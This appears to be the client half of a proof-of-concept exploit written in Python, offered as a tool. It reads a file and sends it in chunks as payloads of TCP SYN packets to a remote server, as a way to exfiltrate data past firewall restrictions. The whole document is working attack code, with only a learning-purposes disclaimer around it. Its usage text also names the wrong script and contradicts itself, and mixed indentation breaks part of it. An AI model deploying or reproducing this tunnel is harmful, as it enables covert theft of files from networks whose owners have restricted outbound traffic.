#####################################################################################################################
# PoC exploit for data transfer over TCP handshake mechanism (Bypassing Firewall Restrictions)                      #
# The exploit implemented with client and server scripts, this is the CLIENT.                                       #
# This tool is for learning porpuses only, The authors doesn't responsible for any damage caused by using this tool #
# Discovered By: Stas Volfus                                                                                        #
# Exploit written by : Stas Volfus, Idan Cohen, Kassif Dekel                                                        #
# Usage : SynTunnel_s.py port filename       (requires root)                                                        #
#####################################################################################################################

import sys
from scapy.all import *
import socket

def makeTcpRequest(stringData, ServerIP, Port):
	synReq=IP(dst=ServerIP)/TCP(dport=Port, flags="S")/Raw(load=stringData)
	send(synReq,iface="eth0", verbose=False)
	return

def getFileByteCode(filePath):
	mainFile = open(filePath, "rb")
	data = mainFile.read() 
	mainFile.close()
	return data

def sendFileWithSyn(fileData, ServerIP, PacketDataSize, Port):
	i = 0
	packet = 1
	fileSize = len(fileData)
	FragmentsAmount = fileSize / PacketDataSize + 1

	print 'Sending ' + str(FragmentsAmount) + ' Packets'
	while i < fileSize:
		makeTcpRequest(fileData[i:i+PacketDataSize], ServerIP, Port)
		print 'Finished Sending Part ' + str(packet) + ' ' + fileData[i:i+PacketDataSize]
		packet = packet + 1
		i = i + PacketDataSize
	
def Main(argv):
	print "########################################################################################################"
        print "#PoC exploit for data transfer over TCP handshake mechanism (Bypassing Firewall Restrictions)          #"
        print "#The exploit implemented with client and server scripts, this is the CLIENT.                           #"
        print "#The authors doesn't responsible for any damage caused by using this tool                              #"
	print "#Discovered By: Stas Volfus                                                                            #"
        print "#Exploit written by : Stas Volfus, Idan Cohen, Kassif Dekel                                            #"
        print "#Usage : SynTunnel_s.py [port] [port] [filename] [Bytes(default=100)]          (requires root)         #"
        print "########################################################################################################"
	
	if len(sys.argv) < 4 or len(sys.argv) > 5:
		print "\n[-] SynTunnel_c.py [ip] [port] [file_path] [Bytes(default=100)]"
		exit()

	if len(sys.argv) == 5:
		PacketDataSize = int(sys.argv[4])
		
	else:
		PacketDataSize = 100

	ServerIP = sys.argv[1]
	Port = int(sys.argv[2])
	FilePath = sys.argv[3]
	fileData = getFileByteCode(FilePath)
	sendFileWithSyn(fileData, ServerIP, PacketDataSize, Port)	
	return;
	
Main(sys.argv)